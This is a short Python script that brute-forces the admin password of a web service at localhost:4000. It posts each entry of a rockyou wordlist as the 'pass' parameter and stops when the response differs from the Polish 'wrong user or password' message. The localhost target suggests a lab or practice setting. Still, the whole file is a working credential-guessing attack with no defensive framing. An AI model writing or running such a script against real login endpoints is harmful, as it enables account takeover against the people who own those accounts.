import requests

i = 0

with open("./rockyou-40.txt", "r") as f:
    for line in f.readlines():
        i += 1
        if i % 1000 == 0:
            print(i, line)
        r = requests.post(
            f"http://localhost:4000/users?login=admin&pass={line.strip()}"
        )
        if r.text != '{"message":"zly user lub hasło"}':
            print(r.text)
            print(f"Poprawne hasło to {line}")
            break
